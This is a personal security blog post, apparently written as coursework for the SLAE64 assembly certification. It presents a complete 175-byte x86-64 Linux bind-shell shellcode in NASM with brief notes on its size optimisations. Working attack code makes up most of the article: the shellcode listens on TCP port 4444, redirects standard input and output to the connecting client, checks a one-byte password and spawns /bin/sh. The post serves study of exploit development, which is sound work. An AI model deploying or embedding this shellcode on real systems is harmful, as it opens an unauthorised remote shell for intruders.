<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Benjamin Lim">
  <meta name="description" content="There are many SLAE64 blogposts each explaining their variant of shellcode out there. I thought I would join in the fun. This is my version of the...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="../theme/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="../theme/css/pygments.css" type="text/css" media="all">
  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js"></script>


  
 

  <link href="https://limbenjamin.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="limbenjamin Full Atom Feed" />

<meta name="keywords" content="limbenjamin, Security">

<meta property="og:title" content="SLAE64 #1 - Bindshell TCP shellcode">
<meta property="og:type" content="website">
<meta property="og:image" content="http://limbenjamin.com/media/code.png"/>
<meta property="og:image:secure_url" content="https://limbenjamin.com/media/code.png"/>
<meta property="og:site_name" content="https://limbenjamin.com">
<meta property="og:description" content="There are many SLAE64 blogposts each explaining their variant of shellcode out there. I thought I would join in the fun. This is my version of the Bindshell TCP shellcode. I&#39;ll keep it brief and only list down the interesting or unique points in my shellcode. Line 9: To reduce …">
<meta property="og:url" content="https://limbenjamin.com/articles/slae64-1-bindshell-tcp-shellcode.html">
<meta property="fb:admins" content="557193263"/>
<meta property="fb:app_id" content="520142688161055"/>


  <title>SLAE64 #1 - Bindshell TCP shellcode</title>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-028MBYWX6K"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-028MBYWX6K');
</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container">
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse navbar-default" id="navbarSupportedContent">
            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
              <li class="nav-item"><a class="nav-link" href="/index.html" >Index
<i class="fa  fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/about-me.html" >About me
<i class="fa  fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/files/cv.html" >Résumé
<i class="fa  fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/gpg.txt" >GPG Key
<i class="fa  fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/projects.html" >Projects
<i class="fa  fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/reading-list.html" >Reading List
<i class="fa  fa-lg"></i></a></li>
            </ul>
            <div class="d-flex">
                <a class="nav-link" href="https://limbenjamin.com/feeds/all.atom.xml" title="Feed" >
<i class="fa fa-rss fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="#mail" title="Email" >
<i class="fa fa-envelope fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://sg.linkedin.com/in/1imbenjamin" title="LinkedIn" >
<i class="fa fa-linkedin fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://github.com/limbenjamin" title="GitHub" >
<i class="fa fa-github fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://security.stackexchange.com/users/53583/limbenjamin" title="StackExchange" >
<i class="fa fa-stack-exchange fa-lg"></i></a><div style="padding-right: 1em;"></div>
               <div class="oval">
                <center>
                  <img src="/files/nricspecimengen/merlion.png" class="merlion" style="height: 30px;"/>
                </center>
               </div> 
            </div>
          </div>
        </div>
      </nav>

    <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href=".."><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"   width="233.45px" height="184.71px" viewBox="0 0 233.45 184.71" enable-background="new 0 0 233.45 184.71" xml:space="preserve"><ellipse id="c1" fill="none" cx="60.2" cy="57.5" rx="3.6" ry="3.1"/><ellipse id="c2" fill="none" cx="56.4" cy="103.3" rx="3.3" ry="3.2"/><ellipse id="c3" fill="none" cx="99.8" cy="121.7" rx="3.3" ry="3.1"/><ellipse id="c4" fill="none" cx="151.8" cy="124.9" rx="3.3" ry="2.8"/><ellipse id="c5" fill="none" cx="172.5" cy="87" rx="3.8" ry="2.9"/><ellipse id="c6" fill="none" cx="176.8" cy="41.1" rx="3.5" ry="3.1"/><ellipse id="c7" fill="none" cx="132.8" cy="23.3" rx="3.4" ry="3.2"/><ellipse id="c8" fill="none" cx="81.3" cy="19.8" rx="3.7" ry="3.4"/><path id="path4" fill="#FFF" stroke="#C4E6FC" stroke-width="12" stroke-miterlimit="10" d="M86 58l10-8s10-3 11-1c1 1-7 7-7 7L88 67v4c1 1 2 3 3 2l21-18 10-5h7L89 85l1 4 2 4c3 0 42-38 46-41h4l2 4-1 3-38 33-2 3 5 2 5-1c8-6 20-25 30-25l1 2 1 1-1 4s-19 12-17 18l5 1 4-2 6-4 5-4"/>    <path id="path3" fill="none" stroke="#0e94ec" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M114 85l-7 1-2-8h-2l11-1-12-10 13 2-7-6 8 1-7-5h3l5 2 6-2 2 5 5 3-9 3 7 1-8 4 9 2 1 3h-6l-4 1v4l3 2 4-3"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M64 139v15c0 5 3 8 7 8 5 1 9-2 10-6s-1-7-7-9l-7 2M154 163c-1-4 1-8-1-13-2-2-6-3-10-3-4 1-7 7-5 10 2 5 8 7 12 5l3-3"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M116 15c2 10 0 19 1 29M117 101c-1 9 1 19-1 29M183 72h-34M84 72H52"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M131 147v17c1 4-2 6-6 5M101 160c-6 3-9 3-14-2v-7c2-3 6-5 10-4s6 4 7 7l-16 1M15 140v23"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 87c-6-1-11 0-14 5l-11 8c1 3 1 6-3 7-3-2-3-2-3-6h6M133 101v7l16 14M174 44c4 1 4 1 7-2l-3-4c-5 0-6 1-4 6l-12 10c-4 4-8 5-13 4M85 23l8 7c6 4 7 9 7 14M85 49c-1 10 0 19 1 29v15c0 4 3 6 8 6l22 1 25-1"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M110 163v-7c0-6 0-7 7-9 6 0 8 4 7 8v8"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 23c0-2 2-4 0-6-3-1-5-1-7 2 1 4 3 5 7 4"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M175 150c2-2 5-4 9-3 4 2 5 5 5 8s1 5-1 8M43 150c3-2 5-4 9-3 5 2 5 5 5 8v8M204 150c2-2 5-3 8-3 9 3 5 10 6 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M100 101v16M133 27c-2 0-3-1-4-3 0-2 1-4 5-4 2 0 2 2 3 4-4 2-4 6-4 10v10M64 58c0 2-1 3-3 3-3 0-4-2-5-3l4-4 1 1c4 4 9 3 13 3h10M90 47l4-1h46s4 0 7 5v13a425 425 0 01-1 34"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M196 147v16M22 147c0 5-1 10 1 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M106 82c-3-1-4 1-4 3 1 3 3 5 7 5 3 1 5-1 7-2M131 73c5 4 6 7 2 10l-3 3c-1 4-5 5-9 4-4 0-5-3-5-6l1-18M121 62l6-1v-6c-4-1-7-1-10 2M128 61c8 3 9 6 4 12M173 84c5 2 5 3 0 6-3 0-3-2-5-3 0 0 2-3 4-3M116 60c2-4-1-6-5-5-4 0-7 1-6 6"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M43 163v-9c0-2 0-5-3-6s-6-1-9 1l-2 2c1 4-1 8 1 12M175 163v-9c0-2 0-5-4-6-3-1-6-1-8 1l-2 2v12M203 147v16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M108 101c0 3 1 6-1 9M125 34v10M84 65H73M84 80H73M109 34l-1 10M99 118c-3 1-3 3-2 5s3 2 5 1c2-2 2-5-2-6M106 61c-9 2-10 5-6 11M125 101v7M104 71c-8 4-8 8-2 13M150 122c-3 3-3 3 1 6 3 0 4-1 5-3-1-3-3-3-5-3M149 65h12M150 81h11M169 87h-19"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M22 144v-1M132 144v-1M196 144v-1"/></svg></a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="../tag/coding.html" >Coding (12)</a> &#124; 
                <a href="../tag/data.html" >Data (18)</a> &#124; 
                <a href="../tag/legal.html" >Legal (17)</a> &#124; 
                <a href="../tag/nus.html" >NUS (3)</a> &#124; 
                <a href="../tag/security.html" >Security (119)</a> &#124; 
                <a href="../tag/server.html" >Server (29)</a> &#124; 
                <a href="../tag/untagged.html" >Untagged (19)</a> &#124; 
                <a href="../archives.html" >Archives (188)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2019-05-17 22:35:00+08:00">May 17, 2019</time></span>
        <h1 class="entry-title-single-page"><a href="../articles/slae64-1-bindshell-tcp-shellcode.html">SLAE64 #1 - Bindshell TCP shellcode</a></h1>
      </header><!-- .entry-header -->
      <div class="entry-content">
        <p>There are many SLAE64 blogposts each explaining their variant of shellcode out there. I thought I would join in the fun. This is my version of the Bindshell TCP shellcode. I'll keep it brief and only list down the interesting or unique points in my shellcode.</p>
<ol>
<li>Line 9: To reduce size, I only assigned 2 bytes out of the 8 required for <code>new_sock_struct</code>, which is used to store the client socket descriptor. It will overwrite the <code>lea</code> instruction immediately after but since the instruction has already been executed, it does not matter.</li>
<li>Line 43: Used <code>shr</code> to zero out last 4 bytes of <code>bind_data_struct</code>. Required so that shell can listen on 0.0.0.0.</li>
<li>Line 105: I reused the first byte in <code>bind_data_struct</code> as a buffer to store the password input. By that time, the client has connected and the <code>bind_data_struct</code> is unused.</li>
<li>Line 112: Jump outside of code region if password fails, causing a segfault, save a few bytes compared to exiting gracefully. </li>
</ol>
<p>Total size: 175 bytes</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span>
<span class="normal">125</span>
<span class="normal">126</span>
<span class="normal">127</span>
<span class="normal">128</span>
<span class="normal">129</span>
<span class="normal">130</span>
<span class="normal">131</span>
<span class="normal">132</span>
<span class="normal">133</span>
<span class="normal">134</span>
<span class="normal">135</span>
<span class="normal">136</span>
<span class="normal">137</span>
<span class="normal">138</span>
<span class="normal">139</span>
<span class="normal">140</span>
<span class="normal">141</span>
<span class="normal">142</span>
<span class="normal">143</span>
<span class="normal">144</span>
<span class="normal">145</span>
<span class="normal">146</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>

<span class="k">section</span><span class="w"> </span><span class="nv">.text</span>

<span class="nl">_start:</span>

<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">12</span>
<span class="w">    </span><span class="nl">bind_data_struct:</span><span class="w"> </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span>
<span class="w">    </span><span class="nl">new_sock_struct:</span><span class="w"> </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span>


<span class="nl">shell:</span>

<span class="w">    </span><span class="c1">; store data struct address in r8</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">bind_data_struct</span><span class="p">]</span>

<span class="w">    </span><span class="c1">; sock = socket(AF_INET, SOCK_STREAM, 0)</span>
<span class="w">    </span><span class="c1">; AF_INET = 2</span>
<span class="w">    </span><span class="c1">; SOCK_STREAM = 1</span>
<span class="w">    </span><span class="c1">; syscall number 41</span>

<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">dil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; copy socket descriptor to rdi for future use</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>


<span class="w">    </span><span class="c1">; server.sin_family = AF_INET </span>
<span class="w">    </span><span class="c1">; server.sin_port = htons(PORT)</span>
<span class="w">    </span><span class="c1">; server.sin_addr.s_addr = INADDR_ANY</span>
<span class="w">    </span><span class="c1">; bzero(&amp;server.sin_zero, 8)</span>
<span class="w">    </span><span class="c1">; remove 0x1 by subtracting or shifting it off</span>

<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="mh">0x1</span>
<span class="w">    </span><span class="nf">shr</span><span class="w"> </span><span class="kt">dword</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="mh">0xff</span>

<span class="w">    </span><span class="c1">; bind(sock, (struct sockaddr *)&amp;server, sockaddr_len)</span>
<span class="w">    </span><span class="c1">; syscall number 49</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">49</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
<span class="w">    </span><span class="nf">syscall</span>


<span class="w">    </span><span class="c1">; listen(sock, MAX_CLIENTS)</span>
<span class="w">    </span><span class="c1">; syscall number 50</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span>
<span class="w">    </span><span class="nf">syscall</span>


<span class="w">    </span><span class="c1">; new = accept(sock, (struct sockaddr *)&amp;client, &amp;sockaddr_len)</span>
<span class="w">    </span><span class="c1">; syscall number 43</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">43</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="mi">16</span>
<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r8</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>

<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; store the client socket description </span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>

<span class="w">    </span><span class="c1">; close parent</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; duplicate sockets</span>

<span class="w">    </span><span class="c1">; dup2 (new, old)</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r9</span>

<span class="w">    </span><span class="c1">; STDIN</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; STDOUT</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; STDERR</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">;read password and store in first byte of r8</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="p">]</span>
<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="nf">syscall</span>

<span class="w">    </span><span class="c1">; check password against expected password | , if fail jump out of bounds, should cause a segfault</span>
<span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="p">],</span><span class="w"> </span><span class="mh">0x7C</span>
<span class="w">    </span><span class="nf">jnz</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">44</span>

<span class="w">    </span><span class="c1">; execve</span>

<span class="w">    </span><span class="c1">; First NULL push</span>

<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span>

<span class="w">    </span><span class="c1">; push /bin//sh in reverse</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rbx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f2f6e69622f</span>
<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rbx</span>

<span class="w">    </span><span class="c1">; store /bin//sh address in RDI</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>

<span class="w">    </span><span class="c1">; Second NULL push</span>
<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span>

<span class="w">    </span><span class="c1">; set RDX</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>


<span class="w">    </span><span class="c1">; Push address of /bin//sh</span>
<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rdi</span>

<span class="w">    </span><span class="c1">; set RSI</span>

<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>

<span class="w">    </span><span class="c1">; Call the Execve syscall</span>
<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
<span class="w">    </span><span class="nf">syscall</span>
</code></pre></div></td></tr></table></div>

<p>This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
<p>Student ID: SLAE64-XXXXX</p>
      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="../tag/security.html">Security</a>        <br />
        <div class="similararticleline"></div>
        <h2>Similar Articles</h2>
          <div class="similararticlerow">
              <blockquote class="similar_posts">
              <a href="../articles/slae64-2-revshell-tcp-shellcode.html"><b>SLAE64 #2 - Revshell TCP shellcode
              (100% Similar) - </b>
              This shellcode is very similar to the Bindshell TCP shellcode, so please refer to it for the unique and interesting points. There is only 1 additional point I would like to make: Line 8/37: ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
              (100% Similar) - </b>
              I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/slae64-5-msf-shellcode-analysis.html"><b>SLAE64 #5 - MSF shellcode analysis
              (100% Similar) - </b>
              I would be analysing chunks of the linux/x64/meterpreter/bind_tcp and the linux/x64/shell_bind_tcp and see how they differ. Although both are TCP bind shellcode, the primary difference among them ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
              (100% Similar) - </b>
              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
              </blockquote>
          </div>
      </div>
      <br />
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->

  <div id="mail" class="overlay">
    <div class="popup">
      <a class="close" href="#">&times;</a>
      <div id="popup_content">
      </div>
    </div>
  </div>

  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="../pages/privacy-policy-disclaimer.html">Privacy & Disclaimer</a> | 
                    <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="../sitemap.xml">Sitemap</a><br />
                    This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
                    Page generated on Sat Feb 24 22:25:30 2024<br />
                    &copy; 2012-2024 <a href="..">Benjamin Lim</a> </div>
        </div>
      </div><!-- .site-info -->
